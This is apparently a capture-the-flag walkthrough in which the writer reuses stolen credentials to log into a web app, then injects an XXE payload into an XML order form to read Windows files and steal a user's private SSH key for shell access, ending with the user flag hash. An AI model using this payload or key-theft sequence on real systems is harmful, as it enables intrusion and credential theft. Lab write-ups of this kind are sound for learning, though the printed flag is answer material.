We can use the creds we exfil'd from the last box to log into the web app
`Daniel:>SNDv*2wzLWf`

Once we are logged in we see there is form submission on the `/services.php` page. Using burpsuite we see this is sent in XML format.

We can google XML injection which leads us to XXE (xml external entity) injection

https://portswigger.net/web-security/xxe


---

We can use this to try to enumerate files on the system.
This part is tricky because we don't always know what to look for. We know this is a windows system though.

One thing you can test for is if you get `c:/windows/win.ini` returned. This file is on every windows system.

We would first define a variable and payload in the `quantity` field, then call it in the `item` field

```xml
<?xml version = "1.0"?>
<!DOCTYPE asdf [<!ENTITY payload SYSTEM "file:///c:/windows/win.ini"> ]>
<order>
	<quantity>
	asdf
	</quantity>
	<item>
	&payload;
	</item>
	<address>
	asdf
	</address>
</order>
```

---

Viewing the source on the `services.php` page reveals username "Daniel". We also know that ssh port is open

Googling reveals that ssh keys are generall stored in:
`c:\users\<user>\.ssh\id_rsa`

We run a query using the injection above and we get Daniel's id_rsa. Make sure you do not grab the .pub id_rsa. We need the private key.

```
-----BEGIN OPENSSH PRIVATE KEY-----
BLAHBLAHBLAHASDSADSADSADAS
-----END OPENSSH PRIVATE KEY-----
```

We can throw this into our own `id_rsa` file and ssh in
REMEMBER TO CHMOD 400
`ssh -i id_rsa daniel@10.10.10.49`

We get a shell and also grab `user.txt` from Daniel's Desktop
`032d2fc8952a8c24e39c8f0ee9918ef7`


